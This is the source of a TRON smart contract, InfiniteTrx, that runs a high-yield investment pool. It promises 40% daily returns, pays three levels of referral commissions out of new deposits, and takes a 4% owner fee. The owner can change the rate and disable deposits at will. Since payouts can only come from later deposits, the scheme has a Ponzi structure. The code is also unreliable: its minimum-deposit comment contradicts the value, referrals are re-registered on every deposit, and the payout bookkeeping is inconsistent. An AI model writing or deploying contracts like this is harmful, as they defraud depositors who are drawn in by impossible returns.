//SourceUnit: InfiniteTrx.sol

pragma solidity >=0.4.0 <0.6.0;


contract InfiniteTrx {

    using SafeMath for uint256;

    uint public totalPlayers;
    uint public totalPayout;
    uint public totalInvested;
    uint private minDepositSize = 5000000; //50trx
    uint private interestRateDivisor = 100;
    uint private devCommission = 4;
    uint public commissionDivisor = 100;
    uint private minuteRate = 40;  //40% diario
    uint private releaseTime = 1599058800;
    bool private avl = true;
    address payable owner;
    struct Player {
        address usadr;
        uint trxDeposit;
        uint time;
        uint256 interestProfit;
        uint affRewards;
        uint256 payoutSum;
        address payable affFrom;
        uint256 aff1sum; 
        uint256 aff2sum;
        uint256 aff3sum;
    }

    mapping(address => Player) public players;
    
    modifier onlyOwner {
      require(msg.sender == owner, 'you are not owner');
      _;
    }
    constructor() public {
      owner = msg.sender;
    }
    function register(address _addr, address payable _affAddr) private{
        Player storage player = players[_addr];
        player.affFrom = _affAddr;
        player.usadr = _addr;
        address payable _affAddr1 = _affAddr;
        address payable _affAddr2 = players[_affAddr1].affFrom;
        address payable _affAddr3 = players[_affAddr2].affFrom;
        players[_affAddr1].aff1sum = players[_affAddr1].aff1sum.add(1);
        players[_affAddr2].aff2sum = players[_affAddr2].aff2sum.add(1);
        players[_affAddr3].aff3sum = players[_affAddr3].aff3sum.add(1);
    }
    function deposit(address payable _affAddr) public payable {
        require(now >= releaseTime, "not launched yet!");
        require(msg.value >= minDepositSize, "not minimum amount!");
        require(avl,'disabled deposit in the system');
        uint depositAmount = msg.value;
        Player storage player = players[msg.sender];
        if (players[msg.sender].usadr == msg.sender && players[msg.sender].trxDeposit > 0) {
           register(msg.sender, _affAddr);
        }
        else{
            register(msg.sender, _affAddr);
            player.time = now; 
            totalPlayers++;
        }    
        player.trxDeposit += depositAmount;
        distributeRef(msg.value, player.affFrom);  
        totalInvested +=depositAmount;
        uint feedEarn = depositAmount.mul(devCommission).div(commissionDivisor);
        owner.transfer(feedEarn);
    }
    function withdraw() public returns(uint){
        Player storage player = players[msg.sender];
        uint secPassed = now.sub(player.time);
        if (secPassed > 0) {
            uint collectProfit = (player.trxDeposit.mul(minuteRate)).div(interestRateDivisor);
            uint pft = ((collectProfit/24/60/60)*secPassed)/2;
            player.payoutSum += (collectProfit/24/60/60)*secPassed;
            require(pft < address(this).balance,'no balance in system.');
            player.interestProfit += pft;
            player.trxDeposit += pft;
            player.time = now;
            msg.sender.transfer(pft);
            return pft;
        }else{
            return 0;   
        }
    }
    function reinvest() public returns(uint) {
        Player storage player = players[msg.sender];
        uint tmppft= now.sub(player.time);
        uint256 depositAmount = (player.trxDeposit*minuteRate)/interestRateDivisor;
        uint256 pft = (depositAmount/24/60/60)*tmppft;
        require(pft < address(this).balance,'no balance in the system.');
        player.interestProfit +=pft;
        player.trxDeposit += pft;
        player.time = now;
        uint feedEarn = depositAmount.mul(devCommission).div(commissionDivisor);
        owner.transfer(feedEarn);
        return pft;
    }
    function distributeRef(uint256 _trx, address payable _affFrom) private{
        address payable _affAddr1 = _affFrom;
        address payable _affAddr2 = players[_affAddr1].affFrom;
        address payable _affAddr3 = players[_affAddr2].affFrom;
        uint256 _affRewards = 0;
        if (_affAddr1 != address(0)) {
            _affRewards = (_trx.mul(7)).div(100);
            totalPayout += _affRewards;
            players[_affAddr1].affRewards += _affRewards;
            _affAddr1.transfer(_affRewards);
        }
        if (_affAddr2 != address(0)) {
            _affRewards = (_trx.mul(3)).div(100);
            totalPayout += _affRewards;
            players[_affAddr2].affRewards += _affRewards;
            _affAddr2.transfer(_affRewards);
        }
        if (_affAddr3 != address(0)) {
            _affRewards = (_trx.mul(2)).div(100);
            totalPayout += _affRewards;
            players[_affAddr3].affRewards += _affRewards;
            _affAddr3.transfer(_affRewards);
        }
    }
    function detailsUser() public view returns (uint,uint256,uint256,uint256,uint256) {
        Player storage player = players[msg.sender];
        return (player.time,player.interestProfit,player.trxDeposit,player.payoutSum,player.affRewards);
    }
    function details()public view returns(uint,uint256,uint256,uint256){
        return (minuteRate,totalPlayers,totalPayout,totalInvested);
    }
    function setOwner(address payable _address)public onlyOwner returns(bool){
        owner = _address;
        return true;
    }
    function setReleaseTime(uint256 _ReleaseTime) public onlyOwner returns(bool){
        releaseTime = _ReleaseTime;
        return true;
    }
    function setMinuteRate(uint256 _MinuteRate) public onlyOwner returns(bool){
        minuteRate = _MinuteRate;
        return true;
    }
    function setAvl(uint _avl)public onlyOwner returns(bool){
        if(_avl== 1){
            avl=true;
        }else{
            avl=false;
        }
        return avl;
    }
    function getDetailsDev()public view onlyOwner returns(uint,bool,uint256){
        return (devCommission,avl,totalInvested);
    }
}
library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b);
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;
        return c;
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);
        return c;
    }
}